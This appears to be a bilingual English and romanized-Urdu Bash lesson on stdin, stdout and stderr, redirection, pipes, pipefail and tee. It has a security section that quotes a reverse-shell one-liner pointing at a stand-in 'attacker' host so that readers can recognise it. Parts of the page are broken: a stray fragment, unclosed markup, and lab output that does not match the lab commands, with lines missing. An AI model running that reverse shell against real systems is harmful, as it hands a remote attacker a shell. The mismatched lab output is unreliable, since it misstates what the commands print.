<BigIdea>
<Tr>
<En>
Every command has **one input** and **two outputs**: normal results and error messages. **Redirection** (`>`, `>>`, `2>`, `<`) points them at files. A **pipe** (`|`) plugs one command's output straight into the next command's input, so small tools can work together like an assembly line.
</En>
<Ur>
Har command ka **ek input** aur **do outputs** hote hain: aam nateeje aur error ke paigham. **Redirection** (`>`, `>>`, `2>`, `<`) unhe files ki taraf mor deta hai. **Pipe** (`|`) ek command ka output seedha agli command ke input me laga deta hai, taa ke chhote tools assembly line ki tarah mil kar kaam karein.
</Ur>
</Tr>
</BigIdea>

## At a glance

<Glance>
<What>
<Tr>
<En>

The three **streams**:

- **stdin** (number 0): input, from the keyboard by default
- **stdout** (1): normal output, to the screen
- **stderr** (2): error messages, also to the screen

The tools:

- `> file`: save output (**replaces** the file)
- `>> file`: add to the **end** of the file
- `2> file`: save errors
- `&> file`: save both
- `< file`: read input from a file
- `a | b`: send a's output into b

</En>
<Ur>

Teen **streams**:

- **stdin** (number 0): input, default me keyboard se
- **stdout** (1): aam output, screen par
- **stderr** (2): error ke paigham, ye bhi screen par

Tools:

- `> file`: output save karo (file **badal** jati hai)
- `>> file`: file ke **aakhir** me joro
- `2> file`: errors save karo
- `&> file`: dono save karo
- `< file`: input file se parho
- `a | b`: a ka output b me bhejo

</Ur>
</Tr>
</What>
<Why>
<Tr>
<En>

- **Keep results**: save a report or a list into a file.
- **Answer big questions in one line**: "which 5 IPs made the most requests?" without writing a program.
- **Clean scripts**: hide noise, keep errors apart from results, log everything.
- You'll type pipes **every single day** in DevOps, security and cloud work.

</En>
<Ur>

- **Nateeje rakho**: report ya list file me save karo.
- **Bare sawal ek line me**: "kin 5 IPs ne sab se zyada requests kin?" baghair program likhe.
- **Saaf scripts**: shor chhupao, errors ko nateejon se alag rakho, sab kuch log karo.
- DevOps, security aur cloud ke kaam me aap pipes **har roz** likhenge.

</Ur>
</Tr>
</Why>
<When>
<Tr>
<En>

- saving the output of a command
- writing a log from a cron job
- searching, sorting and counting log lines
- hiding expected errors like "Permission denied"

</En>
<Ur>

- command ka output save karte waqt
- cron job se log likhte waqt
- log lines dhoondte, tarteeb dete aur ginte waqt
- "Permission denied" jaise mutawaqqa errors chhupate waqt

</Ur>
</Tr>
</When>
<How>
<Tr>
<En>

Read a pipeline **left to right**, like water flowing:

`grep ERROR app.log | sort | uniq -c`

= "find the ERROR lines → sort them → count the duplicates".

</En>
<Ur>

Pipeline ko **baayen se dayen** parhein, jaise paani beh raha ho:

`grep ERROR app.log | sort | uniq -c`

= "ERROR wali lines dhoondo → tarteeb do → dohri lines gino".

</Ur>
</Tr>
</How>

## Picture it

<Tr>
<En>

Think of **water pipes** in a house. Each command is a machine with:

- **one inlet** (input)
- **two outlets**: clean water (normal output) and dirty water (errors)

Normally both outlets pour onto the floor (your **screen**).

- **Redirection** attaches a hose from an outlet to a **bucket** (a file).
- A **pipe** `|` connects one machine's clean outlet to the **next machine's inlet**, so water flows through a chain: filter, then heater, then tap.

</En>
<Ur>

Ghar ke **paani ke pipes** ka socho. Har command ek machine hai jis ke paas:

- **ek andar aane ka raasta** (input)
- **do nikalne ke raaste**: saaf paani (aam output) aur ganda paani (errors)

Aam taur par dono farsh par girte hain (aap ki **screen**).

- **Redirection** kisi nikaas se **balti** (file) tak pipe jor deta hai.
- **Pipe** `|` ek machine ka saaf nikaas **agli machine ke andar** jor deta hai, taa ke paani zanjeer se guzre: filter, phir heater, phir nalka.

</Ur>
</Tr>

<FlowStep>`uniq -c` counts them</FlowStep>

## Words you'll see

<Tr>
<En>

| Word | What it means | Example |
| --- | --- | --- |
| **Stream** | A flow of text into or out of a program | the output of `ls` |
| **Redirect** | Send a stream to or from a file instead | `ls > files.txt` |
| **Pipe** | Connect one command's output to the next one's input | `ls \| wc -l` |
| **Pipeline** | A chain of commands joined by pipes | `cat log \| grep ERROR \| sort` |
| **File descriptor** | The number of a stream: 0, 1 or 2 | the `2` in `2>` |
| **/dev/null** | A bin: anything sent there disappears | `2> /dev/null` |

## Learn it step by step

<Walkthrough>

<Step title="Two kinds of output">

<Tr>
<En>

Here `ls` finds one file and can't find another. Both lines appear on the screen, but they come from **different streams**: the file it found is **stdout**, the complaint is **stderr**. Because they're separate, we can send them to different places.

</En>
<Ur>

Yahan `ls` ek file dhoond leta hai aur doosri nahi. Dono lines screen par aati hain, lekin **alag streams** se: mili hui file **stdout** hai, shikayat **stderr**. Chun ke ye alag hain, hum inhe alag jagah bhej sakte hain.

</Ur>
</Tr>

```bash
ls /etc/hostname /no/such/file
```

```text output
ls: cannot access '/no/such/file': No such file or directory
/etc/hostname
```

</Step>

<Step title="> saves output (and replaces the file)">

<Tr>
<En>

`command > file` sends normal output into a file instead of the screen. If the file already exists, it's **replaced** completely.

</En>
<Ur>

`command > file` aam output screen ki jagah file me bhejta hai. Agar file pehle se ho, to wo poori **badal** di jati hai.

</Ur>
</Tr>

```bash
echo "first line" > notes.txt
cat notes.txt
echo "second line" > notes.txt
cat notes.txt
```

```text output
first line
second line
```

<Happened>
<Tr>
<En>The second `>` **replaced** the whole file: "first line" is gone.</En>
<Ur>Doosre `>` ne poori file **badal** di: "first line" ghayab ho gayi.</Ur>
</Tr>
</Happened>

<Callout type="danger" title="> empties the file immediately">
<Tr>
<En>`>` empties the file **before** the command even runs. So `sort data.txt > data.txt` leaves you with an **empty** `data.txt`. Write to a new file, then rename it.</En>
<Ur>`>` command chalne se **pehle hi** file khaali kar deta hai. Isliye `sort data.txt > data.txt` ke baad `data.txt` **khaali** milti hai. Nayi file me likhein, phir naam badlein.</Ur>
</Tr>
</Callout>

</Step>

<Step title=">> adds to the end">

<Tr>
<En>

`>>` is like `>`, but it **adds** to the end instead of replacing. Perfect for **logs**, which grow line by line and should never lose their history. The file is created if it doesn't exist.

</En>
<Ur>

`>>` `>` jaisa hai, lekin badalne ke bajaye aakhir me **jorta** hai. **Logs** ke liye behtareen, jo line ba line barhte hain aur jin ki tareekh kabhi nahi mitni chahiye. File na ho to ban jati hai.

</Ur>
</Tr>

```bash
echo "08:00 backup started" >> backup.log
echo "08:05 backup finished" >> backup.log
cat backup.log
```

```text output
08:00 backup started
08:05 backup finished
```

</Step>

<Step title="2> sends errors somewhere else">

<Tr>
<En>

`2>` redirects stream **2** (errors). Use it to keep error messages out of your results, or to save them in their own log.

- `> out.txt 2> err.txt`: results and errors in **two different** files
- `2> /dev/null`: throw errors away

</En>
<Ur>

`2>` stream **2** (errors) ko mor deta hai. Ise error ke paighamat nateejon se door rakhne, ya un ka alag log banane ke liye istemal karein.

- `> out.txt 2> err.txt`: nateeje aur errors **do alag** files me
- `2> /dev/null`: errors phaink do

</Ur>
</Tr>

```bash
ls /etc/hostname /no/such/file > found.txt 2> errors.txt
echo "--- found.txt (stdout):"; cat found.txt
echo "--- errors.txt (stderr):"; cat errors.txt
```

```text output
--- found.txt (stdout):
/etc/hostname
--- errors.txt (stderr):
ls: cannot access '/no/such/file': No such file or directory
```

<Happened>
<Tr>
<En>The same command as before, but now each stream went into its **own** file.</En>
<Ur>Wahi pehle wali command, lekin ab har stream **apni** file me gayi.</Ur>
</Tr>
</Happened>

</Step>

<Step title="Both streams together: &> and 2>&1">

<Tr>
<En>

For one complete log of everything:

- `&> file`: the short Bash way
- `> file 2>&1`: the portable way. It means "send output to the file, **then** send errors to wherever output is going now".

**The order matters.** `2>&1 > file` does something different. Watch:

</En>
<Ur>

Har cheez ke ek mukammal log ke liye:

- `&> file`: Bash ka chhota tareeqa
- `> file 2>&1`: har jagah chalne wala tareeqa. Matlab "output file me bhejo, **phir** errors wahan bhejo jahan output abhi ja raha hai".

**Tarteeb ahem hai.** `2>&1 > file` kuch aur karta hai. Dekhein:

</Ur>
</Tr>

```bash
ls /etc/hostname /no/such/file &> all.txt
echo "lines in all.txt: $(wc -l < all.txt)"

ls /etc/hostname /no/such/file > right.txt 2>&1
echo "lines in right.txt: $(wc -l < right.txt)"

ls /etc/hostname /no/such/file 2>&1 > wrong.txt | sed 's/^/(still on screen) /'
echo "lines in wrong.txt: $(wc -l < wrong.txt)"
```

```text output
lines in all.txt: 2
lines in right.txt: 2
(still on screen) ls: cannot access '/no/such/file': No such file or directory
lines in wrong.txt: 1
```

<Happened>
<Tr>
<En>

- `&>` and `> file 2>&1` both put **2 lines** (result + error) in the file.
- `2>&1 > file` put only 1 line in the file; the error stayed on the screen.
- Why: Bash reads redirections **left to right**. `2>&1` first points errors at "where output goes **right now**" (the screen). Only **after** that is output moved to the file.
- Rule to remember: **file first, then `2>&1`**.

</En>
<Ur>

- `&>` aur `> file 2>&1` dono ne file me **2 lines** (nateeja + error) daalin.
- `2>&1 > file` ne file me sirf 1 line daali; error screen par raha.
- Kyun: Bash redirections **baayen se dayen** parhta hai. `2>&1` pehle errors ko "jahan output **abhi** ja raha hai" (screen) ki taraf karta hai. Output file me us ke **baad** jata hai.
- Yaad rakhne ka qaida: **pehle file, phir `2>&1`**.

</Ur>
</Tr>
</Happened>

</Step>

<Step title="/dev/null: the bin">

<Tr>
<En>

`/dev/null` swallows everything you send to it. Use it when you only care whether a command **worked**, not what it printed:

- `> /dev/null`: hide output
- `2> /dev/null`: hide errors
- `&> /dev/null`: hide everything

</En>
<Ur>

`/dev/null` jo kuch bhejo nigal leta hai. Ise tab istemal karein jab sirf ye jaanna ho ke command **kamyab** hui, ye nahi ke us ne kya print kiya:

- `> /dev/null`: output chhupao
- `2> /dev/null`: errors chhupao
- `&> /dev/null`: sab chhupao

</Ur>
</Tr>

```bash
if ls /etc > /dev/null; then
  echo "/etc exists (listing was thrown away)"
fi
ls /no/such/folder 2> /dev/null || echo "folder missing (error message was thrown away)"
```

```text output
/etc exists (listing was thrown away)
folder missing (error message was thrown away)
```

</Step>

<Step title="< reads input from a file">

<Tr>
<En>

`command < file` feeds a file into a command's **input**, as if you typed its contents. Handy trick: `wc -l < file` prints **only** the number, while `wc -l file` also prints the file name.

</En>
<Ur>

`command < file` file ko command ke **input** me daalta hai, jaise aap ne us ka mawad khud likha ho. Kaam ki tarkeeb: `wc -l < file` **sirf** number print karta hai, jab ke `wc -l file` file ka naam bhi.

</Ur>
</Tr>

```bash
printf 'banana\napple\ncherry\n' > fruits.txt
sort < fruits.txt
echo "line count: $(wc -l < fruits.txt)"
```

```text output
apple
banana
cherry
line count: 3
```

</Step>

<Step title="| pipes: connect commands">

<Tr>
<En>

`a | b` connects the **output of a** to the **input of b**. No temporary file needed. All the commands run **at the same time**, and data flows through them like an **assembly line**: the first worker cuts, passes it on; the second paints, passes it on; the third packs.

This is the **Unix idea**: many small tools that each do one job well (`grep` only searches, `sort` only sorts, `wc` only counts), joined with pipes to do big jobs.

</En>
<Ur>

`a | b` **a ka output** **b ke input** se jorta hai. Kisi aarzi file ki zaroorat nahi. Saari commands **ek saath** chalti hain, aur data un me **assembly line** ki tarah behta hai: pehla mazdoor kaat kar aage deta hai; doosra rang kar ke aage; teesra pack karta hai.

Yahi **Unix ka khayal** hai: kai chhote tools jo har ek ek kaam achha karte hain (`grep` sirf dhoondta, `sort` sirf tarteeb deta, `wc` sirf ginta), pipes se jur kar bare kaam karte hain.

</Ur>
</Tr>

```bash
cat > access.log <<'EOF'
10.0.0.5 GET /home 200
10.0.0.7 GET /login 401
10.0.0.5 GET /about 200
10.0.0.9 POST /login 401
10.0.0.7 POST /login 401
10.0.0.5 GET /home 200
EOF

echo "Failed logins:"
grep " 401" access.log | wc -l

echo "Requests per IP:"
cut -d' ' -f1 access.log | sort | uniq -c | sort -rn
```

```text output
Failed logins:
3
Requests per IP:
      3 10.0.0.5
      2 10.0.0.7
      1 10.0.0.9
```

<Happened>
<Tr>
<En>

- `grep " 401" | wc -l`: find lines with status 401 (failed login), then count them: **3**.
- The second pipeline, step by step:
  1. `cut -d' ' -f1`: take the **1st column** (the IP), splitting at spaces.
  2. `sort`: put identical IPs next to each other.
  3. `uniq -c`: squash repeated neighbours into one line and **count** them.
  4. `sort -rn`: sort by that count, **r**everse (biggest first), **n**umerically.

</En>
<Ur>

- `grep " 401" | wc -l`: status 401 (fail login) wali lines dhoondo, phir gino: **3**.
- Doosri pipeline, qadam ba qadam:
  1. `cut -d' ' -f1`: spaces par tor kar **pehla column** (IP) lo.
  2. `sort`: ek jaise IPs ko saath saath rakho.
  3. `uniq -c`: saath wali dohri lines ko ek line bana kar **gino**.
  4. `sort -rn`: is ginti se tarteeb, **ulti** (bara pehle), **numbers** ki tarah.

</Ur>
</Tr>
</Happened>

</Step>

<Step title="Did the whole pipeline work? pipefail">

<Tr>
<En>

By default, a pipeline's result is the result of the **last** command only. So `cat missing-file | sort` says "success", because `sort` worked, and your script carries on with **empty** data.

`set -o pipefail` makes the pipeline fail if **any** part fails. `${PIPESTATUS[@]}` shows the result of every part.

</En>
<Ur>

Default me pipeline ka nateeja sirf **aakhri** command ka nateeja hota hai. Isliye `cat missing-file | sort` "kamyabi" kehta hai, kyun ke `sort` chal gaya, aur aap ki script **khaali** data ke saath aage chalti hai.

`set -o pipefail` pipeline ko fail karta hai agar **koi bhi** hissa fail ho. `${PIPESTATUS[@]}` har hisse ka nateeja dikhata hai.

</Ur>
</Tr>

```bash
cat /no/such/file 2>/dev/null | sort
echo "without pipefail: exit $?   (each part: ${PIPESTATUS[*]})"

set -o pipefail
cat /no/such/file 2>/dev/null | sort
echo "with pipefail:    exit $?"
```

```text output
without pipefail: exit 0   (each part: 1 0)
with pipefail:    exit 1
```

<Happened>
<Tr>
<En>`cat` failed (1) but `sort` succeeded (0), so without pipefail the pipeline said 0. With pipefail, it correctly says 1.</En>
<Ur>`cat` fail hua (1) lekin `sort` kamyab (0), isliye pipefail ke baghair pipeline ne 0 kaha. Pipefail ke saath sahi 1 kehti hai.</Ur>
</Tr>
</Happened>

</Step>

<Step title="tee: watch it and save it">

<Tr>
<En>

`tee` copies its input to the **screen and** a file at the same time, like a **T-shaped** pipe joint (that's where the name comes from).

- `command | tee file`: overwrite
- `command | tee -a file`: append

</En>
<Ur>

`tee` apna input **screen aur** file dono me ek saath copy karta hai, **T shakal** ke pipe jor ki tarah (naam yahin se aaya).

- `command | tee file`: badal do
- `command | tee -a file`: aakhir me joro

</Ur>
</Tr>

```bash
echo "deploy started" | tee deploy.log
echo "deploy finished" | tee -a deploy.log
echo "--- deploy.log contains:"
cat deploy.log
```

```text output
deploy started
deploy finished
--- deploy.log contains:
deploy started
deploy finished
```

<Tr>
<En>**Why `sudo tee` for system files?** In `sudo echo "x" > /etc/file`, the `>` is done by **your** shell (not root) before `sudo` even starts, so it gets "Permission denied". With `echo "x" | sudo tee /etc/file`, the writing is done by `tee`, which runs as root.</En>
<Ur>**System files ke liye `sudo tee` kyun?** `sudo echo "x" > /etc/file` me `>` **aap ka** shell karta hai (root nahi), `sudo` shuru hone se pehle hi, isliye "Permission denied". `echo "x" | sudo tee /etc/file` me likhne ka kaam `tee` karta hai, jo root ke taur par chalta hai.</Ur>
</Tr>

</Step>

<Step title="Send your own script's errors to stderr">

<Tr>
<En>

In your scripts, print warnings and errors with `>&2` ("send this to stream 2"). Then when someone saves or pipes your script's output, the errors **don't get mixed into the data**, and they still see them on the screen.

</En>
<Ur>

Apni scripts me warnings aur errors `>&2` ("ise stream 2 me bhejo") ke saath print karein. Phir jab koi aap ki script ka output save ya pipe kare, to errors **data me nahi milte**, aur screen par phir bhi nazar aate hain.

</Ur>
</Tr>

```bash
report() {
  echo "Warning: 1 server did not answer" >&2
  echo "web-1 OK"
  echo "web-2 OK"
}
report > results.txt
echo "--- results.txt only has the data:"
cat results.txt
```

```text output
Warning: 1 server did not answer
--- results.txt only has the data:
web-1 OK
web-2 OK
```

<Happened>
<Tr>
<En>The warning appeared on the screen, but `results.txt` contains only the clean results.</En>
<Ur>Warning screen par aayi, lekin `results.txt` me sirf saaf nateeje hain.</Ur>
</Tr>
</Happened>

</Step>

</Walkthrough>

## Common mistakes

<Compare>
<Bad title="> when you meant >>">

```text
echo "new entry" > app.log     # the whole log is gone
```

</Bad>
<Good title=">> for logs">

```text
echo "new entry" >> app.log
set -o noclobber               # optional: > now refuses to overwrite (>| forces it)
```

</Good>
</Compare>

<Compare>
<Bad title="Same file in and out">

```text
sort data.txt > data.txt       # data.txt is now empty
```

</Bad>
<Good title="Write to a new file, then move it">

```text
sort data.txt > data.sorted && mv data.sorted data.txt
```

</Good>
</Compare>

<Compare>
<Bad title="sudo with >">

```text
sudo echo "127.0.0.1 api.local" >> /etc/hosts
bash: /etc/hosts: Permission denied
```

</Bad>
<Good title="sudo tee">

```text
echo "127.0.0.1 api.local" | sudo tee -a /etc/hosts
```

</Good>
</Compare>

<Challenge title="Stream lab">

<Tr>
<En>
This lab tries every idea from the lesson: two streams into two files, overwrite vs append, the order of `2>&1`, a small log report, pipeline status and `tee`. Run it and compare each line.
</En>
<Ur>
Ye lab lesson ka har khayal aazmata hai: do streams do files me, badalna bamuqabla jorna, `2>&1` ki tarteeb, ek chhoti log report, pipeline ka nateeja aur `tee`. Chalayen aur har line milayen.

```bash
mkdir -p ~/stream-lab && cd ~/stream-lab

# stdout vs stderr into separate files
ls /etc/hostname /nope > out.txt 2> err.txt
echo "out: $(cat out.txt)"; echo "err lines: $(wc -l < err.txt)"

# overwrite vs append
echo one > f.txt; echo two > f.txt; echo "after >: $(cat f.txt)"
echo three >> f.txt; echo "after >>: $(tr '\n' ' ' < f.txt)"

# order of 2>&1
ls /nope > a.txt 2>&1; echo "a.txt lines: $(wc -l < a.txt)"

# a small log report with a pipeline
printf '%s\n' "ERROR db" "INFO ok" "ERROR db" "WARN disk" "ERROR api" > app.log
grep ERROR app.log | sort | uniq -c | sort -rn

# pipeline status
false | true; echo "statuses: ${PIPESTATUS[*]}"

# tee
seq 3 | tee nums.txt | wc -l; echo "nums.txt: $(tr '\n' ' ' < nums.txt)"

cd ~ && rm -rf ~/stream-lab
```

```text output
err lines: 1
after >: two
after >>: two three 
a.txt lines: 1

      1 ERROR api
statuses: 1 0
3
nums.txt: 1 2 3 
```

<DeepDive title="Quick reference">

| Need | Use |
| --- | --- |
| Save output to a file | `command > file` |
| Add to the end of a log file | `command >> file` |
| Hide or save error messages | `command 2> /dev/null` or `2> errors.log` |
| Save everything | `command &> all.log` |
| Feed a file into a command | `command < file` |
| Process output with another tool | `command \| other-command` |
| Save **and** see output | `command \| tee file` |

More gotchas: "useless use of cat" (`cat file | grep x` works, but `grep x file` is simpler), and scripts that print progress to stdout, which corrupts their output when piped. Progress belongs on stderr.

</DeepDive>

<DeepDive title="Real world: finding a brute-force attack in 2 GB of logs">

During an incident, a security engineer needs to know which IPs are brute-forcing the login endpoint and whether any succeeded, from 2 GB of Nginx logs, in a minute:

```bash
# Top 10 IPs with failed logins in today's log (including rotated, compressed files)
zcat -f /var/log/nginx/access.log* \
  | grep 'POST /api/login' \
  | awk '$9 == 401 {print $1}' \
  | sort | uniq -c | sort -rn | head -n 10 \
  | tee /tmp/bruteforce-top10.txt

# Did any of those IPs ever get a 200 on login?
awk '{print $2}' /tmp/bruteforce-top10.txt > /tmp/ips.txt
zcat -f /var/log/nginx/access.log* \
  | grep 'POST /api/login' \
  | grep -F -f /tmp/ips.txt \
  | awk '$9 == 200 {print $1, $4}'
```

No SIEM, no script file: just streams. The second result decides whether this is "block the IPs" or "an account was compromised: start incident response".

</DeepDive>

<DeepDive title="Security lens">

Streams are how data and commands move between processes, including between an attacker and your server.

- **`curl … | bash`** runs whatever arrives, as you. A server can even detect piping and serve different content than what you see in the browser. Download, inspect, verify, then run.
- **Reverse shells** are just redirection: an attacker's payload connects a shell's stdin/stdout/stderr to a network socket (`bash -i >& /dev/tcp/attacker/4444 0>&1`). Detecting `bash -i` with network sockets, or web servers spawning shells, is a standard EDR rule. Recognising the pattern matters when you read suspicious commands in logs.
- **Secrets on stdout end up in logs.** CI systems store everything a job prints. Never `echo`/`cat` secrets, and be careful with `set -x`.
- **`/dev/null` hides evidence:** attackers append `> /dev/null 2>&1` to stay quiet; you should do the opposite and log what your scripts do.
- **Temporary files** in shared folders like `/tmp` can be read or swapped by other users. Use `mktemp` (covered later) with restrictive permissions.

</DeepDive>

<DeepDive title="Interview questions">

<QA q="What are stdin, stdout and stderr?">
They are the three standard streams every process starts with, as file descriptors 0, 1 and 2. stdin is the input (keyboard by default), stdout is normal output and stderr is error and diagnostic output (both to the terminal by default). Keeping them separate lets you redirect or pipe results while still seeing errors.
</QA>

<QA q="What is the difference between > file 2>&1 and 2>&1 > file?">
Redirections are applied left to right, and 2>&1 copies wherever fd 1 currently points. In `> file 2>&1`, stdout goes to the file first and then stderr follows it, so both end up in the file. In `2>&1 > file`, stderr is pointed at the terminal (where stdout was) before stdout is moved to the file, so errors still appear on screen.
</QA>

<QA q="What does a pipe do, and do the commands run one after another?">
A pipe connects the stdout of one command to the stdin of the next through a kernel buffer. All commands in the pipeline run concurrently; each processes data as soon as it arrives, which is why pipelines can work on live or infinite streams such as tail -f.
</QA>

<QA q="Why does sudo echo text > /etc/file fail, and how do you fix it?">
The redirection is performed by your own unprivileged shell before sudo runs, so opening /etc/file fails. sudo only elevates the echo command. Use `echo text | sudo tee /etc/file` (or tee -a to append), so the program writing the file runs as root, or run a root shell with sudo sh -c "...".
</QA>

<QA q="What is set -o pipefail and why does it matter?">
By default a pipeline's exit status is that of the last command, so failures earlier in the pipeline are ignored. With pipefail, the pipeline returns the status of the last command that failed, so errors anywhere are detected by set -e, if statements and CI.
</QA>

</DeepDive>

<Terms>
  <Term name="stdin / stdout / stderr">Standard input, output and error streams; file descriptors 0, 1 and 2.</Term>
  <Term name="File descriptor">A number a process uses to refer to an open file, socket or device.</Term>
  <Term name="Redirection">Sending a stream to or from a file with &gt;, &gt;&gt;, &lt; or 2&gt;.</Term>
  <Term name="Pipe">The | operator connecting one command's stdout to another's stdin.</Term>
  <Term name="/dev/null">A special file that discards everything written to it.</Term>
  <Term name="Here document">Inline multi-line input using &lt;&lt;EOF … EOF.</Term>
  <Term name="tee">Copies its input to a file and to stdout.</Term>
  <Term name="pipefail">Bash option that makes a pipeline fail if any command in it fails.</Term>
  <Term name="Process substitution">&lt;(command): using a command's output as if it were a file.</Term>
</Terms>

<DeepDive title="More practice">

1. Run a command that produces both output and an error. Save only the errors to `errors.log` and discard the rest.
2. Use a quoted here-document to create a script file that contains `$HOME` literally.
3. Append a line to a root-owned file using `sudo tee -a`.
4. Show that `false | true` succeeds, then make it fail with `pipefail`, and print `PIPESTATUS`.
